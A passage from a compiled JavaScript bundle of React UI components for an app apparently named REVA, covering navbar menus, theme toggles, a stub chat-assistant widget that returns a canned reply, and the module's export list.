                                            isDark ? /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(import_lucide_react8.Sun, {
                                                className: "h-5 w-5"
                                            }) : /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(import_lucide_react8.Moon, {
                                                className: "h-5 w-5"
                                            }),
                                            /* @__PURE__ */ (0, import_jsx_runtime26.jsx)("span", {
                                                className: "sr-only",
                                                children: "Toggle theme"
                                            })
                                        ]
                                    })
                                }),
                                /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(DropdownMenuContent, {
                                    align: "end",
                                    children: [
                                        /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(DropdownMenuItem, {
                                            onClick: function() {
                                                return onThemeToggle === null || onThemeToggle === void 0 ? void 0 : onThemeToggle("light");
                                            },
                                            children: [
                                                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(import_lucide_react8.Sun, {
                                                    className: "mr-2 h-4 w-4"
                                                }),
                                                "Light"
                                            ]
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(DropdownMenuItem, {
                                            onClick: function() {
                                                return onThemeToggle === null || onThemeToggle === void 0 ? void 0 : onThemeToggle("dark");
                                            },
                                            children: [
                                                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(import_lucide_react8.Moon, {
                                                    className: "mr-2 h-4 w-4"
                                                }),
                                                "Dark"
                                            ]
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(DropdownMenuItem, {
                                            onClick: function() {
                                                return onThemeToggle === null || onThemeToggle === void 0 ? void 0 : onThemeToggle("glass");
                                            },
                                            children: [
                                                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(import_lucide_react8.Glasses, {
                                                    className: "mr-2 h-4 w-4"
                                                }),
                                                "Glass"
                                            ]
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(DropdownMenuItem, {
                                            onClick: function() {
                                                return onThemeToggle === null || onThemeToggle === void 0 ? void 0 : onThemeToggle("system");
                                            },
                                            children: [
                                                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(import_lucide_react8.Settings, {
                                                    className: "mr-2 h-4 w-4"
                                                }),
                                                "System"
                                            ]
                                        })
                                    ]
                                })
                            ]
                        }),
                        showNotifications && /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(Button, {
                            variant: "ghost",
                            size: "icon",
                            children: [
                                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(import_lucide_react8.Bell, {
                                    className: "h-5 w-5"
                                }),
                                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)("span", {
                                    className: "sr-only",
                                    children: "Notifications"
                                })
                            ]
                        }),
                        showMessages && /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(Button, {
                            variant: "ghost",
                            size: "icon",
                            className: "relative",
                            children: [
                                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(import_lucide_react8.MessageSquare, {
                                    className: "h-5 w-5"
                                }),
                                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(Badge, {
                                    className: "absolute -right-1 -top-1 h-5 w-5 rounded-full p-0 flex items-center justify-center",
                                    children: "3"
                                }),
                                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)("span", {
                                    className: "sr-only",
                                    children: "Messages"
                                })
                            ]
                        }),
                        showBalance && /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)("div", {
                            className: "hidden items-center gap-2 md:flex",
                            children: [
                                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(import_lucide_react8.Wallet, {
                                    className: "h-4 w-4"
                                }),
                                /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)("span", {
                                    className: "text-sm font-medium text-green-600",
                                    children: [
                                        "+",
                                        balance.toLocaleString()
                                    ]
                                })
                            ]
                        }),
                        showCreateButton && /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(Button, {
                            className: "bg-black hover:bg-black/90 text-white",
                            children: "Create"
                        }),
                        showUserMenu && user && /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(DropdownMenu, {
                            children: [
                                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(DropdownMenuTrigger, {
                                    asChild: true,
                                    children: /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(Button, {
                                        variant: "ghost",
                                        size: "icon",
                                        className: "rounded-full",
                                        children: /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(Avatar, {
                                            className: "h-8 w-8",
                                            children: [
                                                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(AvatarImage, {
                                                    src: user.image,
                                                    alt: user.name || "User"
                                                }),
                                                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(AvatarFallback, {
                                                    children: user.initials || "U"
                                                })
                                            ]
                                        })
                                    })
                                }),
                                /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(DropdownMenuContent, {
                                    align: "end",
                                    children: [
                                        /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(DropdownMenuLabel, {
                                            children: [
                                                user.name && /* @__PURE__ */ (0, import_jsx_runtime26.jsx)("p", {
                                                    children: user.name
                                                }),
                                                user.email && /* @__PURE__ */ (0, import_jsx_runtime26.jsx)("p", {
                                                    className: "text-xs text-muted-foreground",
                                                    children: user.email
                                                })
                                            ]
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(DropdownMenuSeparator, {}),
                                        /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(DropdownMenuItem, {
                                            children: [
                                                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(import_lucide_react8.User, {
                                                    className: "mr-2 h-4 w-4"
                                                }),
                                                "Profile"
                                            ]
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(DropdownMenuItem, {
                                            children: [
                                                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(import_lucide_react8.Settings, {
                                                    className: "mr-2 h-4 w-4"
                                                }),
                                                "Settings"
                                            ]
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(DropdownMenuSeparator, {}),
                                        /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(DropdownMenuItem, {
                                            onClick: onLogout,
                                            children: [
                                                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(import_lucide_react8.LogOut, {
                                                    className: "mr-2 h-4 w-4"
                                                }),
                                                "Log out"
                                            ]
                                        })
                                    ]
                                })
                            ]
                        }),
                        /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(Button, {
                            variant: "ghost",
                            size: "icon",
                            className: "ml-2",
                            onClick: onLogout,
                            children: [
                                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(import_lucide_react8.LogOut, {
                                    className: "h-5 w-5"
                                }),
                                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)("span", {
                                    className: "sr-only",
                                    children: "Logout"
                                })
                            ]
                        })
                    ]
                })
            ]
        })
    });
}
function NavbarItem2(param) {
    var item = param.item, pathname = param.pathname;
    if (item.children) {
        return /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(NavigationMenuItem, {
            children: [
                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(NavigationMenuTrigger, {
                    children: item.title
                }),
                /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(NavigationMenuContent, {
                    children: /* @__PURE__ */ (0, import_jsx_runtime26.jsx)("ul", {
                        className: "grid w-[400px] gap-3 p-4 md:w-[500px] md:grid-cols-2 lg:w-[600px]",
                        children: item.children.map(function(child) {
                            return /* @__PURE__ */ (0, import_jsx_runtime26.jsx)("li", {
                                className: "row-span-3",
                                children: /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(NavigationMenuLink, {
                                    asChild: true,
                                    children: /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)(import_link5.default, {
                                        href: child.href || "#",
                                        className: "flex h-full w-full select-none flex-col justify-end rounded-md bg-gradient-to-b from-muted/50 to-muted p-6 no-underline outline-none focus:shadow-md",
                                        children: [
                                            child.icon,
                                            /* @__PURE__ */ (0, import_jsx_runtime26.jsx)("div", {
                                                className: "mb-2 mt-4 text-lg font-medium",
                                                children: child.title
                                            }),
                                            /* @__PURE__ */ (0, import_jsx_runtime26.jsx)("p", {
                                                className: "text-sm leading-tight text-muted-foreground",
                                                children: child.description
                                            })
                                        ]
                                    })
                                })
                            }, child.title);
                        })
                    })
                })
            ]
        });
    }
    return /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(NavigationMenuItem, {
        children: /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(import_link5.default, {
            href: item.href || "#",
            legacyBehavior: true,
            passHref: true,
            children: /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(NavigationMenuLink, {
                className: cn(navigationMenuTriggerStyle(), pathname === item.href && "bg-accent text-accent-foreground", item.disabled && "cursor-not-allowed opacity-60"),
                children: item.title
            })
        })
    });
}
function MobileNavItem3(param) {
    var item = param.item, pathname = param.pathname;
    var _React15_useState = _sliced_to_array(React15.useState(false), 2), isOpen = _React15_useState[0], setIsOpen = _React15_useState[1];
    if (item.children) {
        return /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)("div", {
            className: "flex flex-col",
            children: [
                /* @__PURE__ */ (0, import_jsx_runtime26.jsxs)("button", {
                    className: "flex items-center justify-between py-2 text-base font-medium",
                    onClick: function() {
                        return setIsOpen(!isOpen);
                    },
                    children: [
                        item.title,
                        /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(import_lucide_react8.ChevronDown, {
                            className: cn("h-4 w-4 transition-transform", isOpen && "rotate-180")
                        })
                    ]
                }),
                isOpen && /* @__PURE__ */ (0, import_jsx_runtime26.jsx)("div", {
                    className: "ml-4 mt-2 flex flex-col gap-2",
                    children: item.children.map(function(child) {
                        return /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(import_link5.default, {
                            href: child.href || "#",
                            className: cn("py-2 text-sm", pathname === child.href && "font-medium text-primary", child.disabled && "cursor-not-allowed opacity-60"),
                            children: child.title
                        }, child.title);
                    })
                })
            ]
        });
    }
    return /* @__PURE__ */ (0, import_jsx_runtime26.jsx)(import_link5.default, {
        href: item.href || "#",
        className: cn("py-2 text-base font-medium", pathname === item.href && "text-primary", item.disabled && "cursor-not-allowed opacity-60"),
        children: item.title
    });
}
var defaultNavItems2 = [
    {
        title: "About",
        href: "/about"
    },
    {
        title: "Pricing",
        href: "/pricing"
    },
    {
        title: "Contact",
        href: "/contact"
    }
];
// src/components/new-navbar/ai-assistant.tsx
var React16 = __toESM(require("react"));
var import_lucide_react9 = require("lucide-react");
var import_jsx_runtime27 = require("react/jsx-runtime");
function AiAssistant() {
    var _React16_useState = _sliced_to_array(React16.useState(false), 2), isOpen = _React16_useState[0], setIsOpen = _React16_useState[1];
    var _React16_useState1 = _sliced_to_array(React16.useState(false), 2), isMinimized = _React16_useState1[0], setIsMinimized = _React16_useState1[1];
    var _React16_useState2 = _sliced_to_array(React16.useState(""), 2), input = _React16_useState2[0], setInput = _React16_useState2[1];
    var _React16_useState3 = _sliced_to_array(React16.useState([
        {
            id: "1",
            content: "Hello! How can I help you today?",
            role: "assistant",
            timestamp: /* @__PURE__ */ new Date()
        }
    ]), 2), messages = _React16_useState3[0], setMessages = _React16_useState3[1];
    var messagesEndRef = React16.useRef(null);
    var scrollToBottom = function() {
        var _messagesEndRef_current;
        (_messagesEndRef_current = messagesEndRef.current) === null || _messagesEndRef_current === void 0 ? void 0 : _messagesEndRef_current.scrollIntoView({
            behavior: "smooth"
        });
    };
    React16.useEffect(function() {
        if (isOpen && !isMinimized) {
            scrollToBottom();
        }
    }, [
        messages,
        isOpen,
        isMinimized
    ]);
    var handleSendMessage = function(e) {
        e.preventDefault();
        if (!input.trim()) return;
        var userMessage = {
            id: Date.now().toString(),
            content: input,
            role: "user",
            timestamp: /* @__PURE__ */ new Date()
        };
        setMessages(function(prev) {
            return _to_consumable_array(prev).concat([
                userMessage
            ]);
        });
        setInput("");
        setTimeout(function() {
            var assistantMessage = {
                id: (Date.now() + 1).toString(),
                content: "I'm your AI assistant. I'm here to help with any questions about REVA.",
                role: "assistant",
                timestamp: /* @__PURE__ */ new Date()
            };
            setMessages(function(prev) {
                return _to_consumable_array(prev).concat([
                    assistantMessage
                ]);
            });
        }, 1e3);
    };
    return /* @__PURE__ */ (0, import_jsx_runtime27.jsxs)("div", {
        className: "fixed bottom-4 right-4 z-50 flex flex-col items-end",
        children: [
            isOpen && /* @__PURE__ */ (0, import_jsx_runtime27.jsxs)("div", {
                className: cn("mb-2 w-80 rounded-lg border bg-background shadow-lg transition-all duration-200 ease-in-out", isMinimized ? "h-14" : "h-96"),
                children: [
                    /* @__PURE__ */ (0, import_jsx_runtime27.jsxs)("div", {
                        className: "flex items-center justify-between border-b p-3",
                        children: [
                            /* @__PURE__ */ (0, import_jsx_runtime27.jsxs)("div", {
                                className: "flex items-center gap-2",
                                children: [
                                    /* @__PURE__ */ (0, import_jsx_runtime27.jsx)(Avatar, {
                                        className: "h-6 w-6",
                                        children: /* @__PURE__ */ (0, import_jsx_runtime27.jsx)(AvatarFallback, {
                                            className: "bg-primary text-primary-foreground",
                                            children: "AI"
                                        })
                                    }),
                                    /* @__PURE__ */ (0, import_jsx_runtime27.jsx)("span", {
                                        className: "font-medium",
                                        children: "REVA Assistant"
                                    })
                                ]
                            }),
                            /* @__PURE__ */ (0, import_jsx_runtime27.jsxs)("div", {
                                className: "flex items-center gap-1",
                                children: [
                                    /* @__PURE__ */ (0, import_jsx_runtime27.jsx)(Button, {
                                        variant: "ghost",
                                        size: "icon",
                                        className: "h-6 w-6",
                                        onClick: function() {
                                            return setIsMinimized(!isMinimized);
                                        },
                                        children: isMinimized ? /* @__PURE__ */ (0, import_jsx_runtime27.jsx)(import_lucide_react9.Maximize2, {
                                            className: "h-4 w-4"
                                        }) : /* @__PURE__ */ (0, import_jsx_runtime27.jsx)(import_lucide_react9.Minimize2, {
                                            className: "h-4 w-4"
                                        })
                                    }),
                                    /* @__PURE__ */ (0, import_jsx_runtime27.jsx)(Button, {
                                        variant: "ghost",
                                        size: "icon",
                                        className: "h-6 w-6",
                                        onClick: function() {
                                            return setIsOpen(false);
                                        },
                                        children: /* @__PURE__ */ (0, import_jsx_runtime27.jsx)(import_lucide_react9.X, {
                                            className: "h-4 w-4"
                                        })
                                    })
                                ]
                            })
                        ]
                    }),
                    !isMinimized && /* @__PURE__ */ (0, import_jsx_runtime27.jsxs)(import_jsx_runtime27.Fragment, {
                        children: [
                            /* @__PURE__ */ (0, import_jsx_runtime27.jsxs)("div", {
                                className: "flex-1 overflow-y-auto p-3 h-[calc(100%-7rem)]",
                                children: [
                                    messages.map(function(message) {
                                        return /* @__PURE__ */ (0, import_jsx_runtime27.jsx)("div", {
                                            className: cn("mb-3 max-w-[80%] rounded-lg p-3", message.role === "user" ? "ml-auto bg-primary text-primary-foreground" : "bg-muted"),
                                            children: message.content
                                        }, message.id);
                                    }),
                                    /* @__PURE__ */ (0, import_jsx_runtime27.jsx)("div", {
                                        ref: messagesEndRef
                                    })
                                ]
                            }),
                            /* @__PURE__ */ (0, import_jsx_runtime27.jsx)("form", {
                                onSubmit: handleSendMessage,
                                className: "border-t p-3",
                                children: /* @__PURE__ */ (0, import_jsx_runtime27.jsxs)("div", {
                                    className: "flex gap-2",
                                    children: [
                                        /* @__PURE__ */ (0, import_jsx_runtime27.jsx)(Input, {
                                            placeholder: "Type a message...",
                                            value: input,
                                            onChange: function(e) {
                                                return setInput(e.target.value);
                                            },
                                            className: "flex-1"
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime27.jsx)(Button, {
                                            type: "submit",
                                            size: "icon",
                                            className: "bg-primary",
                                            children: /* @__PURE__ */ (0, import_jsx_runtime27.jsx)(import_lucide_react9.Send, {
                                                className: "h-4 w-4"
                                            })
                                        })
                                    ]
                                })
                            })
                        ]
                    })
                ]
            }),
            /* @__PURE__ */ (0, import_jsx_runtime27.jsx)(Button, {
                onClick: function() {
                    return setIsOpen(!isOpen);
                },
                className: "h-12 w-12 rounded-full bg-primary shadow-lg",
                children: /* @__PURE__ */ (0, import_jsx_runtime27.jsx)(import_lucide_react9.Bot, {
                    className: "h-6 w-6"
                })
            })
        ]
    });
}
// src/components/new-navbar/theme-provider.tsx
var import_next_themes5 = require("next-themes");
var import_jsx_runtime28 = require("react/jsx-runtime");
function ThemeProvider(_param) {
    var children = _param.children, props = _object_without_properties(_param, [
        "children"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime28.jsx)(import_next_themes5.ThemeProvider, _object_spread_props(_object_spread({}, props), {
        themes: [
            "light",
            "dark",
            "system",
            "glass"
        ],
        children: children
    }));
}
// src/components/new-navbar/theme-toggle.tsx
var import_lucide_react10 = require("lucide-react");
var import_next_themes6 = require("next-themes");
var import_jsx_runtime29 = require("react/jsx-runtime");
function ThemeToggle2() {
    var setTheme = (0, import_next_themes6.useTheme)().setTheme;
    return /* @__PURE__ */ (0, import_jsx_runtime29.jsxs)(DropdownMenu, {
        children: [
            /* @__PURE__ */ (0, import_jsx_runtime29.jsx)(DropdownMenuTrigger, {
                asChild: true,
                children: /* @__PURE__ */ (0, import_jsx_runtime29.jsxs)(Button, {
                    variant: "ghost",
                    size: "icon",
                    children: [
                        /* @__PURE__ */ (0, import_jsx_runtime29.jsx)(import_lucide_react10.Sun, {
                            className: "h-[1.2rem] w-[1.2rem] rotate-0 scale-100 transition-all dark:-rotate-90 dark:scale-0"
                        }),
                        /* @__PURE__ */ (0, import_jsx_runtime29.jsx)(import_lucide_react10.Moon, {
                            className: "absolute h-[1.2rem] w-[1.2rem] rotate-90 scale-0 transition-all dark:rotate-0 dark:scale-100"
                        }),
                        /* @__PURE__ */ (0, import_jsx_runtime29.jsx)("span", {
                            className: "sr-only",
                            children: "Toggle theme"
                        })
                    ]
                })
            }),
            /* @__PURE__ */ (0, import_jsx_runtime29.jsxs)(DropdownMenuContent, {
                align: "end",
                children: [
                    /* @__PURE__ */ (0, import_jsx_runtime29.jsx)(DropdownMenuItem, {
                        onClick: function() {
                            return setTheme("light");
                        },
                        children: "Light"
                    }),
                    /* @__PURE__ */ (0, import_jsx_runtime29.jsx)(DropdownMenuItem, {
                        onClick: function() {
                            return setTheme("dark");
                        },
                        children: "Dark"
                    }),
                    /* @__PURE__ */ (0, import_jsx_runtime29.jsx)(DropdownMenuItem, {
                        onClick: function() {
                            return setTheme("system");
                        },
                        children: "System"
                    })
                ]
            })
        ]
    });
}
// Annotate the CommonJS export names for ESM import in node:
0 && (module.exports = {
    AiAssistant: AiAssistant,
    Button: Button,
    Card: Card,
    CardContent: CardContent,
    CardDescription: CardDescription,
    CardFooter: CardFooter,
    CardHeader: CardHeader,
    CardTitle: CardTitle,
    Collapsible: Collapsible,
    CollapsibleContent: CollapsibleContent,
    CollapsibleTrigger: CollapsibleTrigger,
    DropdownMenu: DropdownMenu,
    DropdownMenuCheckboxItem: DropdownMenuCheckboxItem,
    DropdownMenuContent: DropdownMenuContent,
    DropdownMenuGroup: DropdownMenuGroup,
    DropdownMenuItem: DropdownMenuItem,
    DropdownMenuLabel: DropdownMenuLabel,
    DropdownMenuPortal: DropdownMenuPortal,
    DropdownMenuRadioGroup: DropdownMenuRadioGroup,
    DropdownMenuRadioItem: DropdownMenuRadioItem,
    DropdownMenuSeparator: DropdownMenuSeparator,
    DropdownMenuShortcut: DropdownMenuShortcut,
    DropdownMenuSub: DropdownMenuSub,
    DropdownMenuSubContent: DropdownMenuSubContent,
    DropdownMenuSubTrigger: DropdownMenuSubTrigger,
    DropdownMenuTrigger: DropdownMenuTrigger,
    Input: Input,
    Label: Label,
    LoginForm: LoginForm,
    NavHistory: NavHistory,
    NavListings: NavListings,
    NavMain: NavMain,
    NavSecondary: NavSecondary,
    Navbar: Navbar,
    NavbarWrapper: NavbarWrapper,
    NewNavbar: NewNavbar,
    RevaLogo: RevaLogo,
    RevaNavbar: RevaNavbar,
    Separator: Separator,
    Sheet: Sheet,
    SheetClose: SheetClose,
    SheetContent: SheetContent,
    SheetDescription: SheetDescription,
    SheetFooter: SheetFooter,
    SheetHeader: SheetHeader,
    SheetOverlay: SheetOverlay,
    SheetPortal: SheetPortal,
    SheetTitle: SheetTitle,
    SheetTrigger: SheetTrigger,
    Sidebar: Sidebar,
    SidebarContent: SidebarContent,
    SidebarFooter: SidebarFooter,
    SidebarGroup: SidebarGroup,
    SidebarGroupAction: SidebarGroupAction,
    SidebarGroupContent: SidebarGroupContent,
    SidebarGroupLabel: SidebarGroupLabel,
    SidebarHeader: SidebarHeader,
    SidebarInput: SidebarInput,
    SidebarInset: SidebarInset,
    SidebarLeft: SidebarLeft,
    SidebarMenu: SidebarMenu,
    SidebarMenuAction: SidebarMenuAction,
    SidebarMenuBadge: SidebarMenuBadge,
    SidebarMenuButton: SidebarMenuButton,
    SidebarMenuItem: SidebarMenuItem,
    SidebarMenuSkeleton: SidebarMenuSkeleton,
    SidebarMenuSub: SidebarMenuSub,
    SidebarMenuSubButton: SidebarMenuSubButton,
    SidebarMenuSubItem: SidebarMenuSubItem,
    SidebarProvider: SidebarProvider,
    SidebarRail: SidebarRail,
    SidebarSeparator: SidebarSeparator,
    SidebarTrigger: SidebarTrigger,
    Skeleton: Skeleton,
    ThemeProvider: ThemeProvider,
    ThemeToggle: ThemeToggle,
    Tooltip: Tooltip,
    TooltipContent: TooltipContent,
    TooltipProvider: TooltipProvider,
    TooltipTrigger: TooltipTrigger,
    buttonVariants: buttonVariants,
    cn: cn,
    formatDateTime: formatDateTime,
    useIsMobile: useIsMobile,
    useSidebar: useSidebar
});
//# sourceMappingURL=index.js.map